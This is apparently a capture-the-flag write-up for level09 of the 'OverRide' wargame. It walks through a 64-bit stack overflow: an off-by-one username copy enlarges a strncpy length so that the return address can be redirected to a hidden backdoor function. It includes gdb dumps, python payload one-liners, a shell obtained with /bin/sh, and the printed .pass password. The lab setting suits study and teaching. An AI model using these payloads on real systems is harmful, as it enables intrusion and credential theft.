In the function listing we can already find a secret_backdoor() that is never called. This function will run system with arguments read from stdin. The goal will be to pass the address of this function to EIP.

The binary will first read from stdin to get the username. The username will then be manually copied to a buffer, 41 times (for ( i = 0; i <= 40 && s[i]; ++i )). It will then read a second time to get the message, and this time a call to strncpy is made to copy it to the buffer:

    gdb-peda$ disas set_msg 
    Dump of assembler code for function set_msg:
        [...]
        0x00005555554009a2 <+112>:   mov    rax,QWORD PTR [rbp-0x408]
        0x00005555554009a9 <+119>:   mov    eax,DWORD PTR [rax+0xb4]
        0x00005555554009af <+125>:   movsxd rdx,eax
        0x00005555554009b2 <+128>:   lea    rcx,[rbp-0x400]
        0x00005555554009b9 <+135>:   mov    rax,QWORD PTR [rbp-0x408]
        0x00005555554009c0 <+142>:   mov    rsi,rcx
        0x00005555554009c3 <+145>:   mov    rdi,rax
        0x00005555554009c6 <+148>:   call   0x555555400720 <strncpy@plt>
        [...]

In x64 asm, rdx is used to pass the third argument of a function. For strncpy, this argument corresponds to the maximum bytes size copied to the buffer. First we move [rax+0xb4] to eax, then eax is moved to rdx. That means the max size is stored in [rax+0xb4]. If we have a look, we see :

    (gdb) x/x $rax+0xb4
    0x7fffffffe5b4:	0x0000008c

0x8c <=> 140 in dec. So the message can be at most 140 bytes long.

But there's something interesting if we check the location of the username in the stack :

    >: Enter your username
    >>: AAAABBBBCCCCDDDD
    >: Welcome, AAAABBBBCCCCDDDD

    Breakpoint 2, 0x000055555555491f in handle_msg ()
    (gdb) x/100x $rsp
    0x7fffffffe500:	0x0000000a	0x00000000	0x55554c69	0x00005555
    0x7fffffffe510:	0xf7ff7000	0x00007fff	0xf7a94713	0x00007fff
    0x7fffffffe520:	0xf7dd4260	0x00007fff	0xf7dd4260	0x00007fff
    0x7fffffffe530:	0x0000000a	0x00000000	0xf7ff7000	0x00007fff
    0x7fffffffe540:	0x0000002d	0x00000000	0xf7a945da	0x00007fff
    0x7fffffffe550:	0x00000086	0x00000000	0x0000002d	0x00000000
    0x7fffffffe560:	0x0000000a	0x00000000	0x55554c10	0x00005555
    0x7fffffffe570:	0xffffe6b0	0x00007fff	0xf7a95d45	0x00007fff
    0x7fffffffe580:	0xf7dd4260	0x00007fff	0xf7a9608f	0x41414141
    0x7fffffffe590:	0x42424242	0x43434343	0x44444444	0x0000000a
    0x7fffffffe5a0:	0x00000000	0x00000000	0x00000000	0x00000000
    0x7fffffffe5b0:	0x00000000	0x0000008c	0xffffe5d0	0x00007fff

    (gdb) x/x 0x7fffffffe58c
    0x7fffffffe58c:	0x41414141

This address is very close to the strncpy size that we previously found :

    (gdb) x/x $rax+0xb4
    0x7fffffffe5b4:	0x0000008c

We can determine the distance between the beginning of the username address and the strncpy size address : 0xe5b4 - 0xe58c = 0x28 = 40. But we saw previously that we copy up to 41 bytes for the username. That means we can pass a bigger size to strncpy. Let's have a look by passing a size of 0xff (255) :


    level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff"'; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"') > payload

    (gdb) r < payload 
    Starting program: /home/users/level09/level09 < payload
    --------------------------------------------
    |   ~Welcome to l33t-m$n ~    v1337        |
    --------------------------------------------
    >: Enter your username
    >>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
    >>: >: Msg sent!

    Program received signal SIGSEGV, Segmentation fault.
    0x000000000000000a in ?? ()
    (gdb) i r
    rax            0xd	13
    rbx            0x0	0
    rcx            0x7ffff7b01f90	140737348902800
    rdx            0x7ffff7dd5a90	140737351867024
    rsi            0x7ffff7ff7000	140737354100736
    rdi            0xffffffff	4294967295
    rbp            0x6741356741346741	0x6741356741346741
    rsp            0x7fffffffe5d0	0x7fffffffe5d0
    r8             0x7ffff7ff7004	140737354100740
    r9             0xc	12
    r10            0x21	33
    r11            0x246	582
    r12            0x555555554790	93824992233360
    r13            0x7fffffffe6b0	140737488348848
    r14            0x0	0
    r15            0x0	0
    rip            0xa	0xa
    eflags         0x10246	[ PF ZF IF RF ]
    cs             0x33	51
    ss             0x2b	43
    ds             0x0	0
    es             0x0	0
    fs             0x0	0
    gs             0x0	0

We successfully overflowed rbp, causing a segfault, with the 192 - 200th characters. However, rip remains untouched.
This is caused by the so called canonical memory adresses in 64-bit systems. Canonical addresses are anything less than a full 64 bit address. There are different implementations of addressing such as 48 bit or 57 bit. Non-canonical addresses on the other hand fall outside the valid address range and are not considered legitimate memory addresses. This is done to prevent another layer of complexity in memory address translation that would not give a significant benefit, because it's unlikely an OS or app will require all 64-bit address space.

In our case, the string was a 64-bit wide address (for instance passing "AAAAAAAA" would translate the address 0x4141414141414141). That means it's considered as a non-canonical address and thus won't be executed. That's why we can't overflow EIP using this technique.

[source](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow)

Let's see if passing a canonical memory address would overflow eip :

    level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff"'; python -c 'print "\x00" * 250') > payload2
    level09@OverRide:~$ gdb -q ./level09 
    Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
    (gdb) r < payload2
    Starting program: /home/users/level09/level09 < payload2
    --------------------------------------------
    |   ~Welcome to l33t-m$n ~    v1337        |
    --------------------------------------------
    >: Enter your username
    >>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
    >>: >: Msg sent!

    Program received signal SIGSEGV, Segmentation fault.
    0x0000000000000000 in ?? ()

Seems to work as the rip address is now 0x0000000000000000.
We simply need to find a way to get the offset needed for overflowing rip.
We can have a look to the rsp register, which is immediately before the rip register :

    (gdb) x/xg $rsp
    0x7fffffffe5c8:	0x4138674137674136

In 64-bit architecture, registers are... 64 bits long, so in order to display the content in hexadecimal we have to use giant bytes (x/xg). We can see this is part of our pattern, and we get an offset of 200. That means we can most likely use the 201 - 208th characters to overflow EIP. Let's do that using the secret_backdoor() address : 0x000055555555488c

Since the call to system requires an argument read from stdin, we first need to run a shell by calling /bin/sh.

    level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff"'; python -c 'print "\x90" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"') > payload2
    level09@OverRide:~$ cat payload2 - | ./level09 
    --------------------------------------------
    |   ~Welcome to l33t-m$n ~    v1337        |
    --------------------------------------------
    >: Enter your username
    >>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
    >>: >: Msg sent!
    /bin/sh
    cd ../end
    cat .pass
    j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
